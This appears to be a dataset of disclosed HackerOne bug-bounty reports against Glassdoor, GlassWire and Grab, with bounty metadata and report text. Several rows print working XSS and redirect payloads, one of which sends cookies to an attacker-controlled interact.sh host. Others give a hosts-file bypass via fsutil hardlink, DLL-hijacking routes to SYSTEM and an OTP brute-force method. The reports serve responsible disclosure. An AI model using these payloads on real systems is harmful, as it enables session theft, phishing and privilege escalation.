Glassdoor,501-1000,0.0,200m-1b,$100.00,Low,2.0,None,CSS injection via link tag whitelisted-domain bypass - https://www.glassdoor.com,"zonduu  submitted a report to Glassdoor.Jul 3rd (about 1 year ago)Summary:
It is possible load an arbitrary .css file. Bypassing the protections by adding the domain https://www.glassdoor.com in a parameter/path.
Affected URL or select Asset from In-Scope:

https://www.glassdoor.com/api/widget/apiError.htm?action=employer-single-review&css=https://zonduu.me/example.css?http://www.glassdoor.com/&format=320x280&responsetype=embed&reviewid=3762318&version=1&format=320x280&responsetype=embed&reviewid=3762318&version=1

Affected Parameter:

css

Browsers tested:

All

Steps To Reproduce:

https://www.glassdoor.com/api/widget/apiError.htm?action=employer-single-review&css=https://zonduu.me/example.css?http://www.glassdoor.com/&format=320x280&responsetype=embed&reviewid=3762318&version=1&format=320x280&responsetype=embed&reviewid=3762318&version=1

It will inject https://zonduu.me/example.css?http://www.glassdoor.com/ in the href of the second link tag.
Code 116 BytesWrap lines Copy Download1<link href='https://zonduu.me/example.css?http://www.glassdoor.com/' rel='stylesheet' type='text/css' media='all' />
www.glassdoor.com needs to be in input otherwise the server rejects it.
Impact Description:
Impact

Executing arbitrary JavaScript using IE's expression() function.
Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.
Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.",https://hackerone.com/reports/1250730,California,United States,Mill Valley,2021,7,3,17,36
Glassdoor,501-1000,0.0,200m-1b,$500.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,Reflected XSS on https://help.glassdoor.com/GD_HC_EmbeddedChatVF,"l0cpd  submitted a report to Glassdoor.Jun 25th (about 1 year ago)Hi there,
I have found the xss vulnerability at: https://help.glassdoor.com/GD_HC_EmbeddedChatVF
Browsers tested: Firefox, Chrome, Edge (latest version)
Steps To Reproduce:
Go to: https://help.glassdoor.com/GD_HC_EmbeddedChatVF?FirstName=l0cpd%22};a=alert,b=document.domain,a(b)//
Supporting Material/References (screenshots, logs, videos):
Image F1352792: firefox_LDd0w4rMHT.png 87.28 KiBZoom in Zoom out Copy Download
Regards,
@l0cpd
Impact
The attacker can execute JS code.1 attachment:F1352792: firefox_LDd0w4rMHT.png",https://hackerone.com/reports/1244053,California,United States,Mill Valley,2021,6,25,10,1
Glassdoor,501-1000,0.0,200m-1b,"$1,000.00",Medium,5.6,Cross-site Scripting (XSS) - Reflected,Reflected XSS on https://www.glassdoor.com/employers/sem-dual-lp/,"parzel  submitted a report to Glassdoor.Apr 10th (3 years ago)Summary:
There is a reflected XSS on https://www.glassdoor.com/employers/sem-dual-lp/ through the utm_source parameter. By using URL encoding I was able to bypass the WAF.
Affected URL or select Asset from In-Scope:
https://www.glassdoor.com/
Affected Parameter:
utm_source
Vulnerability Type:
XSS
Browsers tested:
Firefox 75.0
Steps To Reproduce:

Visit the following POC link:

Code 141 BytesWrap lines Copy Download1https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
Explanation
The utm_source parameter is not escaped properly for URL encoded values. We can escape at multiple locations in the source. I escaped in the script section. The payload finished open function calls from jQuery, executes an alert as POC and then finished the original script tag. Basically we can dissect it as follows:
Code 473 BytesWrap lines Copy Download1abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
2
3is url encoded for
4
5abc`;return+false});});alert`xss`;</script>
6
7which is used like
8
9abc`;                       Finish the string
10return+false});      Finish the jQuery click function
11});                            Finish the jQuery ready function
12alert`xss`;              Here we can execute our code
13</script>               This closes the script tag to prevent JavaScript parsing errors
Supporting Material/References (screenshots, logs, videos):
Image F782251: Screenshot_from_2020-04-10_12-08-05.png 30.96 KiBZoom in Zoom out Copy Download
Impact
A XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim or for phishing attacks.1 attachment:F782251: Screenshot_from_2020-04-10_12-08-05.png",https://hackerone.com/reports/846338,California,United States,Mill Valley,2020,4,10,10,16
Glassdoor,501-1000,0.0,200m-1b,$500.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,Reflected XSS on https://www.glassdoor.com/job-listing/spotlight,"vestige23  submitted a report to Glassdoor.Jul 16th (about 1 year ago)Summary:
The application is vulnerable to reflected cross-site scripting attacks on the /job-listing/spotlight URI in the callback parameter.
Affected URL or select Asset from In-Scope:
https://www.glassdoor.com/job-listing/spotlight
Affected Parameter:
callback
Vulnerability Type: (see list below)
XSS
Browsers tested:
Firefox
Steps To Reproduce:

A malicious SVG HTML attribute is inserted into the callback parameter and the value is URL-encoded:

Code 526 BytesWrap lines Copy Download1    https://www.glassdoor.com/job-listing/spotlight?slots=spotlight-mrec-lf-display&gdBaseUrl=first%2D%2D%3E&adOrderIds=second&callback=%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%3C%68%74%6D%6C%3E%3C%73%76%67%2F%6F%6E%6C%6F%61%64%3D%6C%6F%63%61%74%69%6F%6E%2F%2A%2A%2F%3D%27%68%74%74%70%73%3A%2F%2F%63%33%72%71%6D%77%6B%79%65%64%66%30%30%30%30%72%33%6D%72%30%67%62%68%6D%34%73%63%79%79%79%79%79%62%2E%69%6E%74%65%72%61%63%74%2E%73%68%2F%27%2B%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%3E%3C%2F%68%74%6D%6C%3E%3C%21%2D%2D

The above malicious link is URL-decoded (Burp's Hackvector tags are used to show where URL encoding occurs)

Code 322 BytesWrap lines Copy Download1https://www.glassdoor.com/job-listing/spotlight?slots=spotlight-mrec-lf-display&gdBaseUrl=first<@urlencode_all>--><@/urlencode_all>&adOrderIds=second&callback=<@urlencode_all><!DOCTYPE html><html><svg/onload=location/**/='https://c3rqmwkyedf0000r3mr0gbhm4scyyyyyb.interact.sh/'+document.domain></html><!--<@/urlencode_all>

When a victim user clicks the malicious link a web request is made to an attacker-controlled domain with a URI request of ""document.cookie"" which is ""www.glassdoor.com"".

Supporting Material/References (screenshots, logs, videos):

The attacker's HTML content in the callback parameter is written to the page source.

Image F1379067: glassdoor1.png 208.12 KiBZoom in Zoom out Copy Download

When a victim user clicks the malicious link, a web request is made to the attacker controlled domain with a URI of www.glassdoor.com.

Image F1379066: glassdoor2.png 64.71 KiBZoom in Zoom out Copy Download

The request in image 2 has a referer header of the malicious Glassdoor link, indicating the SVG content generated the web request.

Image F1379068: glassdoor3.png 79.46 KiBZoom in Zoom out Copy Download

In addition, non-HTTPonly cookies can be exfiltrated via this technique. the 'document.domain' payload is modified to document.cookie. 

Image F1379079: glassdoor4.png 332.69 KiBZoom in Zoom out Copy Download

A victim user's cookies are visible in the URI of the resulting web request.

Image F1379086: glassdoor5.png 155.71 KiBZoom in Zoom out Copy Download
Impact Description:
Potential Impact:
An XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim or for phishing attacks.
Details of exploitation scenarios:

The malicious link could be distributed via phishing or social media to victim users.

Impact
A XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim or for phishing attacks.5 attachments:F1379066: glassdoor2.pngF1379067: glassdoor1.pngF1379068: glassdoor3.pngF1379079: glassdoor4.pngF1379086: glassdoor5.pngjjone Glassdoor staff  posted a comment. Jul 16th (about 1 year ago)thanks @vestige23 for your report. I was able to replicate it. Will bring this to the attention of our development team.jjone Glassdoor staff  changed the status to Triaged. Jul 16th (about 1 year ago)Glassdoor  rewarded vestige23 with a $500 bounty. Jul 19th (about 1 year ago)jjone Glassdoor staff  closed the report and changed the status to Resolved. Aug 19th (about 1 year ago)@vestige23 this should have been resolved. Can you confirm the same for us?vestige23   posted a comment. Aug 19th (about 1 year ago)Hey @jjone, the fix works as expected. The app strips characters such as < and % which prevents the XSS attack. 
One thing to consider - set the response header Content-Type: text/javascript. If this can be set and the ajax request handles this response just fine, this would have prevented the XSS attack from working in the first place as the browser would just render the injected HTML as plaintext in the browser.jjone Glassdoor staff  posted a comment. Aug 19th (about 1 year ago)thanks @vestige23 - I will check with the team if we can alter the response header to be plaintext. Thanks for the feedback.vestige23   requested to disclose this report. Aug 19th (about 1 year ago)jjone Glassdoor staff  agreed to disclose this report. Aug 19th (about 1 year ago)  This report has been disclosed. Aug 19th (about 1 year ago)",https://hackerone.com/reports/1265390,California,United States,Mill Valley,2021,7,16,13,21
Glassdoor,501-1000,0.0,200m-1b,"$3,000.00",Critical,9.5,Cross-Site Request Forgery (CSRF),Site wide CSRF affecting both job seeker and Employer account on glassdoor.com,ta8ahi  submitted a report to Glassdoor.Feb 6th (3 years ago)Summary by ta8ahiBug Write-Up at : Witcoat Blog,https://hackerone.com/reports/790061,California,United States,Mill Valley,2020,2,6,18,50
Glassdoor,501-1000,0.0,200m-1b,$100.00,Low,2.0,Information Disclosure,web.xml configuration file disclosure,"deb0con  submitted a report to Glassdoor.Mar 11th (3 years ago)celt   posted a comment. Mar 11th (3 years ago)celt   changed the status to Triaged. Mar 11th (3 years ago)jjone Glassdoor staff  posted a comment. Mar 11th (3 years ago)deb0con   posted a comment. Mar 11th (3 years ago)Glassdoor  rewarded deb0con with a $100 bounty. Mar 11th (3 years ago)deb0con   posted a comment. Mar 11th (3 years ago)deb0con   invited another hacker as a collaborator. Apr 16th (3 years ago)hackforgood   joined this report as a collaborator. Apr 16th (3 years ago)jjone Glassdoor staff  closed the report and changed the status to Resolved. May 27th (2 years ago)deb0con   requested to disclose this report. Nov 28th (2 years ago)jjone Glassdoor staff  agreed to disclose this report. Apr 16th (2 years ago)  This report has been disclosed. Apr 16th (2 years ago)Summary by deb0conCVE-2021-34429
CVSS Score:
5.0
CVSS Vector:
AV:N/AC:L/Au:N/C:P/I:N/A:N",https://hackerone.com/reports/816888,California,United States,Mill Valley,2020,3,11,15,26
Glassdoor,501-1000,0.0,200m-1b,$900.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,XSS at https://www.glassdoor.com/Salary/* via filter.jobTitleExact,"bendtheory  submitted a report to Glassdoor.Feb 6th (3 years ago)Summary:
There exists a Cross Site Scripting and Content Injection vulnerability at https://www.glassdoor.com/Salary/* via the filter.jobTitleExact query parameter. Using URL encoded HTML entities, it is possible to inject HTML content and break out of the context of a <meta> tag. 
The WAF does a good job blocking most javascript payloads and appears to block parentheses, backticks, and document objects. If I do find a way to bypass the WAF and execute a javascript alert or similar, I will add a comment to this report. 
However, it is still possible to inject payloads to achieve content injection and open redirects. The following <meta> tag redirect payload is not blocked by the WAF:
Code 65 BytesWrap lines Copy Download1""&gt;&lt;meta http-equiv=""refresh"" content =""0; url=//bit.ly""&gt;
And here's the final URL used:
https://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bmeta+http-equiv%3D%22refresh%22+content+%3D%220%3B+url%3D%2F%2Fbit.ly%22%26gt%3B&selectedLocationString=N%2C115
The source of the page now looks like this:
Code 218 BytesWrap lines Copy Download1<meta name=""description"" content=""No salaries available for salaries Bain & Company in ""><meta http-equiv=""refresh"" content=""0; url=//bit.ly"">, but Glassdoor has India for similar job titles, locations or employers.""/>
...which will redirect you to https://bit.ly
Affected URL or select Asset from In-Scope:
https://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm
Affected Parameter:
filter.jobTitleExact
Browsers tested:
Firefox and Chrome
Steps To Reproduce:

Click on the prepared URL: https://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bmeta+http-equiv%3D%22refresh%22+content+%3D%220%3B+url%3D%2F%2Fbit.ly%22%26gt%3B&selectedLocationString=N%2C115
You will be redirected to https://bit.ly

Impact Description:
This vulnerability could be used to facilitate phishing campaigns against Glassdoor users by redirecting to malicious sites. With additional research into bypassing the WAF, XSS payloads could steal sensitive cookies or steal credentials from users.
Impact
This vulnerability could be used to facilitate phishing campaigns against Glassdoor users by redirecting to malicious sites. With additional research into bypassing the WAF, XSS payloads could steal sensitive cookies or steal credentials from users.",https://hackerone.com/reports/789689,California,United States,Mill Valley,2020,2,6,0,49
GlassWire,1-10,0.0,under-1m,$25.00,No value,0.0,Violation of Secure Design Principles,Bypass GlassWire's monitoring of Hosts file,"xiaoyinl  submitted a report to GlassWire.May 28th (6 years ago)Product version: 1.2.64beta
OS version: Windows 8.1 Enterprise x86
If a program modifies the Hosts file (C:\Windows\System32\drivers\etc\hosts), GlassWire notifies the user that ""system file changed"" with the path of the hosts file (see attachment ""screenshot_hosts_changed.png""). I discover that a malware (running with admin privilege) can change the content of hosts file without triggering this notification. The method is to use hardlink.
To reproduce:
Step 1: Open cmd.exe as administrator
Step 2: execute ""fsutil hardlink create c:\ProgramData\hosts.txt c:\windows\system32\drivers\etc\hosts"" in cmd.exe
Step 3: execute ""echo ::1 example.local>>c:\ProgramData\hosts.txt"" in cmd.exe
You can see that the notification is not triggered after step3. See ""screenshot_modified_via_hardlink_no_notification.png"".
Now execute ""echo ::1 example2.local>>c:\windows\system32\drivers\etc\hosts"" in cmd.exe. You receive a notification that hosts file is modified, prompted by GlassWire. See ""screenshot_modified_directly_have_notification.png"".3 attachments:F96668: screenshot_hosts_changed.pngF96669: screenshot_modified_directly_have_notification.pngF96670: screenshot_modified_via_hardlink_no_notification.png",https://hackerone.com/reports/141700,Texas,United States,Austin,2016,5,28,14,20
GlassWire,1-10,0.0,under-1m,$100.00,No value,0.0,Code Injection,DLL Hijacking Vulnerability in GlassWireSetup.exe,"ericlaw  submitted a report to GlassWire.Dec 18th (7 years ago)GlasswireSetup.exe is subject to the attack described here: http://textslashplain.com/2015/12/18/dll-hijacking-just-wont-die/
You can get a simple demo with this harmless DLL:
https://bayden.com/dl/shfolder.dll
See attached image for proof of execution.1 attachment:F66038: glasswirebug.png",https://hackerone.com/reports/105977,Texas,United States,Austin,2015,12,18,19,48
GlassWire,1-10,0.0,under-1m,$100.00,No value,0.0,Privilege Escalation,GlassWireSetup.exe subject to EXE planting attack,"ericlaw  submitted a report to GlassWire.Dec 28th (7 years ago)GlassWire recently fixed a DLL hijacking attack whereby trojan DLLs would be loaded from the user's \Downloads\ folder.
However, it appears that GlasswireSetup.exe still uses an unqualified path when running CertUtil.exe and as a consequence a trojaned CertUtil.exe will execute from the \Downloads\ folder. Interestingly, it executes without any security warning that Windows would normally show for a downloaded executable run from the shell (suggesting that CreateProcess was used rather than ShellExecute).
To fix this, it might make the most sense to set the current working directory to the System folder early in the Setup process.1 attachment:F67054: TrojanCertUtil.png",https://hackerone.com/reports/107213,Texas,United States,Austin,2015,12,28,19,4
GlassWire,1-10,0.0,under-1m,$250.00,High,7.0,Privilege Escalation,Uncontrolled Search Path Element allows DLL hijacking for priv esc to SYSTEM,"dawouw  submitted a report to GlassWire.Jul 12th (2 years ago)GlassWire contains a DLL hijacking vulnerability that could allow an authenticated attacker to execute arbitrary code on the targeted system. The vulnerability exists due to GlassWire loading DLL files from the PATH environment variable without verification. The machine should have at least one writable PATH directory for the privilege escalation to work (e.g. having Python, Java, etc. installed).
Nine different DLL's are loaded by the GlassWire Service (GWCtlSrv.exe) as SYSTEM.
One DLL is loaded by the GUI (GlassWire.exe) as the currently logged in user.
Class: Privilege Escalation [CAPEC-233]
Class: Uncontrolled Search Path Element [CWE-427]
Affected Product
GlassWire 2.2.210.0
Proof of Concept
Usually, Python is prepended to the PATH environment (Path=C:\Python38\Scripts\;C:\Python38\;..). For my ease and workflow, I prepended my folder to it (C:\Dima\;). Place the x86 DLL in one of the writable folder paths.
C:\Program Files (x86)\GlassWire\GWCtlSrv.exe
GlassWire (32bit) loads the following DLLs during boot as SYSTEM:

swift.dll
CSUNSAPI.dll
nfhwcrhk.dll
SureWareHook.dll
aep.dll
nfhwcrhk.dll
atasi.dll
nuronssl.dll
ubsec.dll

Image F904704: GlassWire1.png 10.89 KiBZoom in Zoom out Copy Download
Image F904728: GlassWire2.png 19.31 KiBZoom in Zoom out Copy Download
C:\Program Files (x86)\GlassWire\GlassWire.exe
Glasswire GUI (32bit) loads the following DLL after user logon as the current user:

Wtsapi32.dll.dll

Image F904730: GlassWireU.png 16.01 KiBZoom in Zoom out Copy Download
I hope this helps. Please let me know if you require more information.
Kind regards,
Dima van de Wouw
Outflank
Impact
Successful exploitation of the GlassWire service allows an attacker to gain SYSTEM privileges and inject into the GlassWire service process at boot.
Successful exploitation of the GlassWire GUI allows a user to gain persistence. On shared machines, this would allow a user to move laterally to sessions of other users.3 attachments:F904704: GlassWire1.pngF904728: GlassWire2.pngF904730: GlassWireU.png",https://hackerone.com/reports/921675,Texas,United States,Austin,2020,7,12,19,45
Grab,10001,0.0,200m-1b,$200.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,"[growth.grab.com] Reflected XSS via Base64-encoded ""q"" param on ""my.html"" Valentine's microsite","ysx  submitted a report to Grab.Feb 28th (5 years ago)Hi,
An encoded injection in the q parameter on my.html can be used to reflect JavaScript in the growth.grab.com context. This microsite creates a ""Grab's Valentine"" card for a driver over the past year, and carries its data in Base64 format. 
Proof of concept
Please visit the following URL, scroll down and select the Copy button. To demonstrate JavaScript execution, the growth.grab.com context will be displayed in a standard alert box.
Code 391 BytesWrap lines Copy Download1https://growth.grab.com/valentine/active/my.html?q=eyJuYW1lIjogIlRlc3QgSGFja2VyT25lIiwgInN0YXJ0X2RhdGUiOiAiMDEuMDEuMjAxOCIsICJsZWFucGx1bV9pZCI6ICJ0ZXN0IiwgInJpZGVzIjogIjIwMCIsICJwbGFjZXMiOiAiMjAiLCAiZGlzdGFuY2UiOiA1MDAsICJjYW5jZWxfdGltZXMiOiAiMCIsICJkYXlzIjogIjEwMCIsICJwcm9tb19jb2RlIjogImphdmFzY3JpcHQ6Ly9yLmdyYWIuY29tL3Rlc3QlMGFhbGVydChkb2N1bWVudC5kb21haW4pIiwgInByZl9yZXdhcmQiOiAiMTAifQ==
The above proof of concept targets the promo_code JSON key to inject an unfiltered JavaScript URL which an adversary could craft to be convincingly like a referral address:
Code 253 BytesWrap lines Copy Download1{""name"": ""Test HackerOne"", ""start_date"": ""01.01.2018"", ""leanplum_id"": ""test"", ""rides"": ""200"", ""places"": ""20"", ""distance"": 500, ""cancel_times"": ""0"", ""days"": ""100"", ""promo_code"": ""javascript://r.grab.com/test%0aalert(document.domain)"", ""prf_reward"": ""10""}
Supporting evidence
Image F267789: Growth_Valentines_XSS.png 9.02 KiBZoom in Zoom out Copy Download
Verified conditions
At the time of testing, I have successfully confirmed exploitability in the following environment:

Chrome OS 63.0.3239.140 (Official Build) (64-bit)
Firefox 59.0b7 stable (32-bit) on Windows 10 x64

Thanks,
Yasin
Impact
An adversary can leverage this vulnerability in a crafted GET request that, if issued by another Growth user, will cause arbitrary JavaScript code to execute within the target's browser in the context of their web session.1 attachment:F267789: Growth_Valentines_XSS.pngprakhar-prasad   changed the status to Triaged. Feb 28th (5 years ago)Thank you for providing this information to us, it may be a valid security issue. We are sending it to the appropriate product team for further investigation. 
We will keep you updated on our progress. Thanks for keeping Grab safe.ysx   posted a comment. Feb 28th (5 years ago)Thank you very much for the fast triage @prakhar-prasad!prakhar-prasad   posted a comment. Mar 1st (5 years ago)Hi @ysx 
We have deployed a fix to address this. Can you verify if this has been done correctly ?ysx   posted a comment. Mar 1st (5 years ago)Hi @prakhar-prasad,
Confirming the successful fix across all growth.grab.com Valentine's page variations. Thanks again for the excellent response and deployment.prakhar-prasad   closed the report and changed the status to Resolved. Mar 1st (5 years ago)I'm glad that you liked our program :-), thank you for working with us. Your bounty will be processed shortly.
We appreciate your help in keeping Grab and our customers safe and secure.Grab  rewarded ysx with a $200 bounty. Mar 2nd (5 years ago)prakhar-prasad   requested to disclose this report. Mar 2nd (5 years ago)ysx   agreed to disclose this report. Mar 2nd (5 years ago)Thank you for the bounty @prakhar-prasad. I look forward to continuing research on in-scope Grab properties in the weeks ahead, and will proceed to disclose this report.  This report has been disclosed. Mar 2nd (5 years ago)Summary by ysxA microsite on growth.grab.com presents shareable ""Grab Valentine"" cards for drivers, carrying profile data encoded in Base64. 
By injecting a JavaScript URL into the promo_code key, which is intended to hold a referral URL, it was possible to achieve reflected XSS when the victim selected the bottommost ""copy"" button. This endpoint was discovered by manual Twitter recon: searching for recent Tweets containing grab.com.",https://hackerone.com/reports/320679,Singapore,Singapore,Singapore,2018,2,28,7,28
Grab,10001,0.0,200m-1b,"$5,000.00",Critical,9.5,Information Disclosure,Access Grab_Road BigData Database via Open Presto coordinator,vinothkumar  submitted a report to Grab.Sep 7th (5 years ago),https://hackerone.com/reports/266766,Singapore,Singapore,Singapore,2017,9,7,14,56
Grab,10001,0.0,200m-1b,$251.00,Medium,4.3,Command Injection - Generic,CSV Injection https://hub.grab.com,poison  submitted a report to Grab.Jun 29th (5 years ago),https://hackerone.com/reports/244292,Singapore,Singapore,Singapore,2017,6,29,8,8
Grab,10001,0.0,200m-1b,$200.00,Medium,5.45,Cross-site Scripting (XSS) - DOM,[parcel.grab.com] DOM XSS at /assets/bower_components/lodash/perf/,"thsa  submitted a report to Grab.Jul 12th (5 years ago)Summary: DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner (Source)
Description: It is observed in https://parcel.grab.com/assets/bower_components/lodash/perf/ endpoint that the value given in build and other GET parameters are accessed by client side script and written on page using document.write without output encoding - resulting DOM XSS. 
Vulnerable client side cod in page:
Image F202292: grab_parcel_DXSS_build_AND_other_pageSource.PNG 89.56 KiBZoom in Zoom out Copy Download
which will track back to script source - in switch default value has been set to build which will be same as user injected in parameter.
(Script link: https://parcel.grab.com/assets/bower_components/lodash/perf/asset/perf-ui.js)
Image F202294: grab_parcel_DXSS_build_AND_other_scriptSource.PNG 76.11 KiBZoom in Zoom out Copy Download
Browsers Verified In:

Mozilla Firefox (Latest)

Steps To Reproduce:
Open any of below links in Mozilla Firefox and observe the script execution.
Injected in build GET parameter:

https://parcel.grab.com/assets/bower_components/lodash/perf/?build=lodash%22%3E%3C/script%3E%3Ch1%3Evagg-a-bond%20is%20here%20:D%3C/h1%3E%3Cimg%20src=1%20onerror=alert(1)%3E&other=lodash

Injected in other GET parameter:

https://parcel.grab.com/assets/bower_components/lodash/perf/?build=lodash&other=lodash%22%3E%3C/script%3E%3Ch1%3Evagg-a-bond%20is%20here%20:D%3C/h1%3E%3Cimg%20src=1%20onerror=alert(1)%3E

Supporting Material/References:
Execution Screenshot:
Image F202293: grab_parcel_DXSS_build_AND_other.PNG 42.05 KiBZoom in Zoom out Copy Download3 attachments:F202292: grab_parcel_DXSS_build_AND_other_pageSource.PNGF202293: grab_parcel_DXSS_build_AND_other.PNGF202294: grab_parcel_DXSS_build_AND_other_scriptSource.PNGnozz_   updated the severity from high (7.4) to medium. Jul 12th (5 years ago)nozz_   changed the status to Triaged. Jul 12th (5 years ago)Hello @vagg-a-bond and welcome in our bug bounty program.
We have reviewed your bug report and would like to inform you that your submission is valid. We would request you give us some time while our teams are working on the fix. We will update you once the issue has been fixed so that you can verify the same.
We appreciate your help in keeping Grab and our customers safe and secure.
Happy hunting.thsa   posted a comment. Updated Jul 12th (5 years ago)Thank you! By the way I set High because HackerOne's CVSS Calculator set so. However I rechecked policy as it is to be set to Medium. 
Lemme know once you have any update.
Regards,
Vathsa. nozz_   posted a comment. Jul 13th (5 years ago)Hi @vagg-a-bond 
We consider that cross-site Scripting as a medium security issue. We request you to kindly refer to our bug bounty page at https://hackerone.com/grab for updated information on reward and details of our bug bounty program.
Can you verify if this issue has been fixed? Your bounty will be processed shortly.nozz_   posted a comment. Jul 13th (5 years ago)Hi again,
Our bad the fix is not deployed yet. We will update you once the issue has been fixed.nozz_   posted a comment. Jul 14th (5 years ago)Hi @vagg-a-bond !
Now it's fixed. Can you verify if this issue has been correctly fixed?
Your bounty will be processed shortly.thsa   posted a comment. Jul 14th (5 years ago)Hello @nozz_
I have retested and confirmed the fix. nozz_   closed the report and changed the status to Resolved. Jul 14th (5 years ago)Thank you for working with us and helping us in resolving this issue.Grab  rewarded thsa with a $200 bounty. Jul 16th (5 years ago)thsa   posted a comment. Jul 17th (5 years ago)Thank you! thsa   requested to disclose this report. Jul 17th (5 years ago)Public disclosure ?   This report has been disclosed. Aug 16th (5 years ago)",https://hackerone.com/reports/248560,Singapore,Singapore,Singapore,2017,7,12,5,59
Grab,10001,0.0,200m-1b,"$1,000.00",High,7.5,Improper Authentication - Generic,Authorization bypass using login by phone option+horizontal escalation possible on Grab Android App,"Summary by sp1d3rsSummary
I found a OTP code bypass on the login endpoint, used by Grab Android App. Since no password was required upon login (only SMS code), it was actually account takeover (still, the victim will be informed that something is wrong  because of few incoming SMSes with codes).
The team was very responsible and fixed the issue fast.
Thanks to the Grab team for the great experience and the bounty! It is a pleasure to work with you!
Technique
The used method (thanks to the @yaworsk and his #149598 report!) is highly depending on the luck due to low enough chance to guess correct code using only 3 attempts in 30 seconds (and we must consider that the server may not throw the one of the choosen codes for a very long time). So account takeover is not so easy, and requires a lot of time. The side effect of this - it is abusing the SMS sending mechanism (it was fixed too).
Why it works
1) The code had only 4 digits (with 5-6 digits chance to guess the code dramatically drop). Even with 4 digits tool can work a week without results.
and
2) There was no limiting on the code refreshing attempts  (now it is, and also account can be locked).
Used tools and apps:
1) Nox App Player (android emulator), proxied through web debugging proxy.
2) Tested application - https://play.google.com/store/apps/details?id=com.grabtaxi.passenger (app allows registration from any country)
3) Custom C# tool for SMS code refreshing.",https://hackerone.com/reports/205000,Singapore,Singapore,Singapore,2017,2,9,15,59
Grab,10001,0.0,200m-1b,"$3,000.00",High,7.5,Improper Authentication - Generic,Leak ██████████ information in real time through API request,severus  submitted a report to Grab.Jan 19th (5 years ago),https://hackerone.com/reports/307050,Singapore,Singapore,Singapore,2018,1,19,7,33
Grab,10001,0.0,200m-1b,"$1,000.00",Medium,5.45,Information Disclosure,Registration enabled on ███grab.com,"grouptherapy  submitted a report to Grab.Feb 21st (5 years ago)Summary:
An attacker can register an account on the █████████grab.com service, and access information from the service
Description:
While logging in via Google accounts is prohibited, an attacker can register an account through the /login/create endpoint, as per the below request
Code 454 BytesWrap lines Copy Download1POST /login/create HTTP/1.1
2Host: █████grab.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://███grab.com/
8Authorization: Bearer null
9Content-Type: application/json
10Content-Length: 61
11Cookie: G_ENABLED_IDPS=google; G_AUTHUSER_H=0
12Connection: close
13
14{""userid"":""█████"",""password"":""██████""}
This can then be used to log in via the /login endpoint ,as in the following request:
Code 448 BytesWrap lines Copy Download1POST /login HTTP/1.1
2Host: █████grab.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://█████grab.com/
8Authorization: Bearer null
9Content-Type: application/json
10Content-Length: 61
11Cookie: G_ENABLED_IDPS=google; G_AUTHUSER_H=0
12Connection: close
13
14{""userid"":""██████"",""password"":""████""}
which returns a valid token. F265433
This token can be used to access some of the endpoints, such as
/api/find/users, as in the following request: F265434
Impact
An attacker can access information in the system such as registered users. The application appears to be newly developed, and as such little information is stored currently.prakhar-prasad   posted a comment. Feb 21st (5 years ago)Thank you for participating in our Grab Bug Bounty Program.
We are currently reviewing your bug report, we would request you give us some time while we validate your bug report.
Thanks you for your patience.prakhar-prasad   changed the status to Triaged. Feb 21st (5 years ago)We have reviewed your bug report and would like to inform you that your submission is valid. We would request you give us some time while our teams are working on the fix. We will update you once the issue has been fixed so that you can verify the same.
We appreciate your help in keeping Grab and our customers safe and secure.Grab  rewarded grouptherapy with a $1,000 bounty. Feb 23rd (5 years ago)prakhar-prasad   posted a comment. Feb 23rd (5 years ago)Hi @grouptherapy, 
We have taken down the affected service and we'll get it redesigned. Please confirm if you're no longer able to reproduce this behaviour ?
    
    
        
            
                
                
                
            
        
    
grouptherapy   posted a comment. Feb 23rd (5 years ago)Thanks for the bounty! 
I can confirm that I can no longer reproduce this behavior.prakhar-prasad   closed the report and changed the status to Resolved. Feb 24th (5 years ago)Thank you for working with us and helping us in resolving this issue. We appreciate your help in keeping Grab and our customers safe and secure.prakhar-prasad   requested to disclose this report. Feb 27th (5 years ago)grouptherapy   agreed to disclose this report. Feb 28th (5 years ago)  This report has been disclosed. Feb 28th (5 years ago)",https://hackerone.com/reports/318099,Singapore,Singapore,Singapore,2018,2,21,6,45
Grab,10001,0.0,200m-1b,$500.00,Medium,4.3,Improper Authentication - Generic,Two-factor authentication bypass on Grab Android App,"sp1d3rs  submitted a report to Grab.Jan 31st (6 years ago)Description
I found the endpoint using android app https://p.grabtaxi.com/api/passenger/v2/profiles/edit which allow me to bypass 2FA (sms code) due to lack of rate limiting\code expiration after unsuccessful attempts.
